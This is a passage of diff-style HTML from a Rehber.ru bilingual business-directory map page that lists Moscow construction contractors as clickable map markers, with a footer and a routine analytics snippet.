+<img src="http://old.rehber.ru/images/onmap/hint/hint_01.gif" width="11" height="12" /></td>
+<td width="100%" height="12" colspan="2" align="left" valign="top" background="http://old.rehber.ru/images/onmap/hint/hint_02.jpg">
+</td>
+<td width="11" height="12" align="left" valign="top">
+<a href="javascript:document.getElementById('hint').style.visibility='hidden';void(0);"><img src="http://old.rehber.ru/images/onmap/hint/hint_03.gif" width="11" border="0" height="12" /></a></td>
+</tr>
+<tr>
+<td width="11" height="100%" align="left" valign="top" background="http://old.rehber.ru/images/onmap/hint/hint_04.jpg">
+</td>
+<td width="100%" height="100%" colspan="2" align="center" valign="middle" bgcolor="#FFFFFF">
+<table id="hinttabletext">
+					<tr>
+						<td id="tdru"><h2 class="hinthead"><span>ПРИЗМА</span></h2><hr><div class="hinttext"><span class="hintaddr">ул.&nbsp;Садовническая, д.&nbsp;57</span><br /><span class="hinttel">Тел.:&nbsp;8&nbsp;(495)&nbsp;258-95-38</span></div></td>
+						<td id="tdrzd">&nbsp;</td>
+						<td id="tdtr"><h2 class="hinthead">PRİZMA</h2><hr /><div class="hinttext"><span class="hintaddr">ul.&nbsp;Sadovniçeskaya, d.&nbsp;57</span><br /><span class="hinttel">Tel.:&nbsp;8&nbsp;(495)&nbsp;258-95-38</span></div></td>
+					</tr>
+				 </table>
+</td>
+<td width="11" height="100%" align="left" valign="top" background="http://old.rehber.ru/images/onmap/hint/hint_06.jpg">
+</td>
+</tr>
+<tr>
+<td width="11" height="12" align="left" valign="top">
+<img src="http://old.rehber.ru/images/onmap/hint/hint_07.gif" width="11" height="12" /></td>
+<td style="margin: 0px; padding: 0px;" align="left" width="100%" height="12" colspan="2" background="http://old.rehber.ru/images/onmap/hint/hint_08_2.jpg">
+<img src="http://old.rehber.ru/images/onmap/hint/hint_08_1.jpg" width="20" height="12" /></td>
+<td width="11" height="12" align="left" valign="top">
+<img src="http://old.rehber.ru/images/onmap/hint/hint_09.gif" width="11" height="12" /></td>
+</tr>
+<tr align="left">
+<td style="margin: 0px; padding: 0px;" width="30" height="21" colspan="4" align="left" valign="top">
+<img src="http://old.rehber.ru/images/onmap/hint/hint_10.gif" width="30" height="21" /></td>
+</tr>
+</table>
+</td></tr></table>
+</div>
+</div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 374px; left: 190px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/197-413.html#p197413" onMouseOver="window.status='РАСЕН КОНСТРАКШН / RASEN CONSTRUCTION'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="РАСЕН КОНСТРАКШН / RASEN CONSTRUCTION" title="РАСЕН КОНСТРАКШН / RASEN CONSTRUCTION" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 546px; left: 349px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/356-585.html#p356585" onMouseOver="window.status='РЕАЛТИ СТРОЙ / REALTY STROY'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="РЕАЛТИ СТРОЙ / REALTY STROY" title="РЕАЛТИ СТРОЙ / REALTY STROY" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 391px; left: 476px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/483-430.html#p483430" onMouseOver="window.status='СИНЕРДЖИ ИНШААТ / SINERGY İNŞAAT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="СИНЕРДЖИ ИНШААТ / SINERGY İNŞAAT" title="СИНЕРДЖИ ИНШААТ / SINERGY İNŞAAT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 179px; left: 338px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/345-218.html#p345218" onMouseOver="window.status='ТРОЙ ГРУПП / TROY GROUP'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ТРОЙ ГРУПП / TROY GROUP" title="ТРОЙ ГРУПП / TROY GROUP" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 515px; left: 229px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/236-554.html#p236554" onMouseOver="window.status='ЙАМАТА ЙАТЫРЫМ / YAMATA YATIRIM'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЙАМАТА ЙАТЫРЫМ / YAMATA YATIRIM" title="ЙАМАТА ЙАТЫРЫМ / YAMATA YATIRIM" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 340px; left: 626px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/633-379.html#p633379" onMouseOver="window.status='ЙЕНИГЮН ИНШААТ / YENİGÜN İNŞAAT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЙЕНИГЮН ИНШААТ / YENİGÜN İNŞAAT" title="ЙЕНИГЮН ИНШААТ / YENİGÜN İNŞAAT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 444px; left: 639px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/646-483.html#p646483" onMouseOver="window.status='ЗОРЛУ ИНДАСТРИАЛ / ZORLU İNDUSTRİAL'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЗОРЛУ ИНДАСТРИАЛ / ZORLU İNDUSTRİAL" title="ЗОРЛУ ИНДАСТРИАЛ / ZORLU İNDUSTRİAL" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 347px; left: 189px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/196-386.html#p196386" onMouseOver="window.status='НЕРГИЗ / NERGİZ DEKORASYON TASARIM LTD.ŞTİ'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="НЕРГИЗ / NERGİZ DEKORASYON TASARIM LTD.ŞTİ" title="НЕРГИЗ / NERGİZ DEKORASYON TASARIM LTD.ŞTİ" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 317px; left: 254px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/261-356.html#p261356" onMouseOver="window.status='КАРАНФИЛ МЕРМЕР ГРАНИТ / KARANFİL MERMER GRANİT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="КАРАНФИЛ МЕРМЕР ГРАНИТ / KARANFİL MERMER GRANİT" title="КАРАНФИЛ МЕРМЕР ГРАНИТ / KARANFİL MERMER GRANİT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 515px; left: 351px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/358-554.html#p358554" onMouseOver="window.status='МАКРО ТЕКНИК / MAKRO TECHNİK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МАКРО ТЕКНИК / MAKRO TECHNİK" title="МАКРО ТЕКНИК / MAKRO TECHNİK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 315px; left: 343px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/350-354.html#p350354" onMouseOver="window.status='НОВАТЭК / NOVATEK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="НОВАТЭК / NOVATEK" title="НОВАТЭК / NOVATEK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 618px; left: 140px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/147-657.html#p147657" onMouseOver="window.status='МЕТ МЮХЕНДИСЛИК / MET MÜHENDİSLİK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕТ МЮХЕНДИСЛИК / MET MÜHENDİSLİK" title="МЕТ МЮХЕНДИСЛИК / MET MÜHENDİSLİK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 519px; left: 351px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/358-558.html#p358558" onMouseOver="window.status='МАКРО ТЕКНИК / MAKRO TECHNİK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МАКРО ТЕКНИК / MAKRO TECHNİK" title="МАКРО ТЕКНИК / MAKRO TECHNİK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 348px; left: 190px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/197-387.html#p197387" onMouseOver="window.status='СТЭНД / STAND'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="СТЭНД / STAND" title="СТЭНД / STAND" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 92px; left: 492px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/499-131.html#p499131" onMouseOver="window.status='АРСУ / ARSU'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АРСУ / ARSU" title="АРСУ / ARSU" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 570px; left: 598px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/605-609.html#p605609" onMouseOver="window.status='РУСЭТКИН / RUSETKİN'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="РУСЭТКИН / RUSETKİN" title="РУСЭТКИН / RUSETKİN" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 232px; left: 143px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/150-271.html#p150271" onMouseOver="window.status='ТитанБилдингСистемс / TitanBuildingSystems'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ТитанБилдингСистемс / TitanBuildingSystems" title="ТитанБилдингСистемс / TitanBuildingSystems" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 516px; left: 352px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/359-555.html#p359555" onMouseOver="window.status='МЕСКЕН / MESKEN'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕСКЕН / MESKEN" title="МЕСКЕН / MESKEN" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 560px; left: 600px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/607-599.html#p607599" onMouseOver="window.status='ЭСТА КОНСТРАКШЕН / ESTA CONSTRUCTION'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЭСТА КОНСТРАКШЕН / ESTA CONSTRUCTION" title="ЭСТА КОНСТРАКШЕН / ESTA CONSTRUCTION" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 545px; left: 351px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/358-584.html#p358584" onMouseOver="window.status='ТОРОСТРОЙ / TOROSTROY'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ТОРОСТРОЙ / TOROSTROY" title="ТОРОСТРОЙ / TOROSTROY" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 374px; left: 71px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/78-413.html#p78413" onMouseOver="window.status='КОНТЕК / KONTEK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="КОНТЕК / KONTEK" title="КОНТЕК / KONTEK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 749px; left: 594px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/601-788.html#p601788" onMouseOver="window.status='МОДУЛЬ КОНСТРАКШН / MODUL CONSTRUCTION'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МОДУЛЬ КОНСТРАКШН / MODUL CONSTRUCTION" title="МОДУЛЬ КОНСТРАКШН / MODUL CONSTRUCTION" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 545px; left: 351px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/358-584.html#p358584" onMouseOver="window.status='МЕТА-МАДЖ СТРОЙ / META-MADJ STROY'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕТА-МАДЖ СТРОЙ / META-MADJ STROY" title="МЕТА-МАДЖ СТРОЙ / META-MADJ STROY" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 220px; left: 267px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/274-259.html#p274259" onMouseOver="window.status='АСА АСАНСЁР / ASA ASANSÖR'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АСА АСАНСЁР / ASA ASANSÖR" title="АСА АСАНСЁР / ASA ASANSÖR" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 181px; left: 567px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/574-220.html#p574220" onMouseOver="window.status='АЙ ДИ ЭС / IDS'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АЙ ДИ ЭС / IDS" title="АЙ ДИ ЭС / IDS" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 584px; left: 613px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/620-623.html#p620623" onMouseOver="window.status='ЭФ АЙ ГРУП ИНЖИНИРИНГ / Fİ  GROUP ENGİNEERİNG'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЭФ АЙ ГРУП ИНЖИНИРИНГ / Fİ  GROUP ENGİNEERİNG" title="ЭФ АЙ ГРУП ИНЖИНИРИНГ / Fİ  GROUP ENGİNEERİNG" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 428px; left: 658px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/665-467.html#p665467" onMouseOver="window.status='СТРОЙПРОМГАРАНТ / STROYPROMGARANT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="СТРОЙПРОМГАРАНТ / STROYPROMGARANT" title="СТРОЙПРОМГАРАНТ / STROYPROMGARANT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 341px; left: 624px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/631-380.html#p631380" onMouseOver="window.status='МЕГАТЕК / MEGATEK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕГАТЕК / MEGATEK" title="МЕГАТЕК / MEGATEK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 380px; left: 585px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/592-419.html#p592419" onMouseOver="window.status='ГЕРУС-СТРОЙ / GERUS-STROY'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ГЕРУС-СТРОЙ / GERUS-STROY" title="ГЕРУС-СТРОЙ / GERUS-STROY" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 545px; left: 351px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/358-584.html#p358584" onMouseOver="window.status='ТЕРМОТЕХНИК / TERMOTEKNİK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ТЕРМОТЕХНИК / TERMOTEKNİK" title="ТЕРМОТЕХНИК / TERMOTEKNİK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 378px; left: 296px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/303-417.html#p303417" onMouseOver="window.status='ДОРЧЕ ПРЕФАБРИК ЯПЫ ВЕ ИНШААТ САНАЙИ ТИДЖАРЕТ / DORÇE PREFABRİK YAPI VE İNŞAAT SANAYI TİCARET A.Ş.'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ДОРЧЕ ПРЕФАБРИК ЯПЫ ВЕ ИНШААТ САНАЙИ ТИДЖАРЕТ / DORÇE PREFABRİK YAPI VE İNŞAAT SANAYI TİCARET A.Ş." title="ДОРЧЕ ПРЕФАБРИК ЯПЫ ВЕ ИНШААТ САНАЙИ ТИДЖАРЕТ / DORÇE PREFABRİK YAPI VE İNŞAAT SANAYI TİCARET A.Ş." />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 374px; left: 71px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/78-413.html#p78413" onMouseOver="window.status='ПРОЕКТНО-СТРОИТЕЛЬНАЯ КОМПАНИЯ СТАНД / PROEKNO-STROİNELNAYA KOMPANİYA STAND'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ПРОЕКТНО-СТРОИТЕЛЬНАЯ КОМПАНИЯ СТАНД / PROEKNO-STROİNELNAYA KOMPANİYA STAND" title="ПРОЕКТНО-СТРОИТЕЛЬНАЯ КОМПАНИЯ СТАНД / PROEKNO-STROİNELNAYA KOMPANİYA STAND" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 473px; left: 414px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/421-512.html#p421512" onMouseOver="window.status='ВЕНТПРОФИ / VENTPORFİ'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ВЕНТПРОФИ / VENTPORFİ" title="ВЕНТПРОФИ / VENTPORFİ" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 618px; left: 140px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/147-657.html#p147657" onMouseOver="window.status='ЧЕЛИК / ÇELİK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЧЕЛИК / ÇELİK" title="ЧЕЛИК / ÇELİK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 378px; left: 296px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/303-417.html#p303417" onMouseOver="window.status='ДОРЧЕ ХОЛДИНГ / DORÇE HOLDİNG'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ДОРЧЕ ХОЛДИНГ / DORÇE HOLDİNG" title="ДОРЧЕ ХОЛДИНГ / DORÇE HOLDİNG" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 81px; left: 226px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/233-120.html#p233120" onMouseOver="window.status='КТМ-СТРОЙ / KTM-STROY'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="КТМ-СТРОЙ / KTM-STROY" title="КТМ-СТРОЙ / KTM-STROY" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 168px; left: 490px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/497-207.html#p497207" onMouseOver="window.status='АРТЕНА / ARTENA'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АРТЕНА / ARTENA" title="АРТЕНА / ARTENA" />
+</a></div>
+</div><!-- #onmap_content-->
+                </div><!-- #onmap_container--><div class="onmap_sr"><div class="onmapcategory"><table id="onmapcategory_table" border="0" cellpadding="0" cellspacing="0"><tr valign="bottom" align="left">
+<td valign="middle">
+<a class="onmapcategory_ball" href="/construction/construction/elektrik-i-ler.html">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" alt="Электромонтажные организации" title="Электромонтажные организации" />
+</a></td>
+<td valign="bottom">
+<a class="onmapcategory_text" href="/construction/construction/elektrik-i-ler.html">
+<h4>Электромонтажные организации<br />Elektrik işler</h4> 
+</a></td></tr>
+<tr valign="bottom" align="left">
+<td valign="middle">
+<a class="onmapcategory_ball" href="/construction/construction/muteahhitlik-ve-ta-eronluk.html">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" alt="Генподрядные и субподрядные организации" title="Генподрядные и субподрядные организации" />
+</a></td>
+<td valign="bottom">
+<a class="onmapcategory_text" href="/construction/construction/muteahhitlik-ve-ta-eronluk.html">
+<b><h4>Генподрядные и субподрядные организации<br />Müteahhitlik ve taşeronluk</h4> 
+</b></a></td></tr>
+<tr valign="bottom" align="left">
+<td valign="bottom">
+<a class="onmapcategory_ball" href="/construction/construction.html">
+<img src="http://old.rehber.ru/images/onmap/ball/all.gif" border="0" width="11px" height="11px" alt="" />
+</a>
+</td>
+<td valign="bottom">
+<a class="onmapcategory_text" href="/construction/construction.html">
+все
+</a></td></tr>
+</table>
+</div>
+</div><!-- .onmap_sr --></div><!-- #onmap_middle -->
+
+
+	
+        </div><!-- #content-->
+
+
+	</div> <!--#middle-->
+
+
+
+
+    <div id="tmpl_botthornews_cont">
+   	    
+                   
+    </div>
+
+
+
+
+
+
+
+
+	<div id="tmpl_footer">
+
+        <img src="/templates/onmap/images/tmpl/r6_c1.gif" id="r6_c1"  alt="" />
+        
+        <div id="foot_wh">
+            <div id="foot_wh_cont">
+                                    <div class="olipm_news">
+<table>
+<tbody>
+<tr>
+<td><a href="/novosti/vaktine-de-er-verenler-icin-program.html"><img src="/images/stories/news/metrosm.png" width="90" height="78" alt="metrosm" style="margin-right: 5px; margin-bottom: 5px; float: left;" /></a>
+<h3><a href="/novosti/vaktine-de-er-verenler-icin-program.html">Vaktine değer verenler için program…</a></h3>
+</td>
+<td><a href="/novosti/herhalde-rus-dilinde-en-zor-olan.html"><img src="/images/stories/news/ruscadasm.png" width="65" alt="ruscadasm" height="90" style="margin-bottom: 5px; margin-right: 5px; float: left;" /></a>
+<h3><a href="/novosti/herhalde-rus-dilinde-en-zor-olan.html">Herhalde Rus dilinde en zor olan…</a></h3>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+                            </div>
+        </div>
+        
+        <br class="clearfloat" />
+	
+		<img src="/templates/onmap/images/tmpl/r7_c1.gif" id="r7_c1"  alt="" />
+		
+		
+		<div id="tmpl_bottbann">
+					</div>
+		
+		
+		<img src="/templates/onmap/images/tmpl/r7_c10.gif" id="r7_c10"  alt="" />
+		<br class="clearfloat" />
+   
+   </div><!-- #footer -->
+   
+   
+   <div id="tmpl_count">     
+        <div id="tmpl_counters">
+       		    			<!-- Yandex.Metrika -->
+<script src="//mc.yandex.ru/metrika/watch.js" type="text/javascript"></script>
+<script type="text/javascript">
+try { var yaCounter730753 = new Ya.Metrika(730753); } catch(e){}
+</script>
+<noscript><img src="//mc.yandex.ru/watch/730753" style="position:absolute" alt="" /></noscript>
+<!-- /Yandex.Metrika -->
+    		    	</div>	
+    	<div id="tmpl_copyright">
+    		    			<p>Rehber.ru © 2009 - 2010.</p>
+    		    	</div>
+        
+    </div><!-- #tmpl_count -->
+    
+    
+
+</div><!-- #wrapper -->
+
+</body>
+</html>
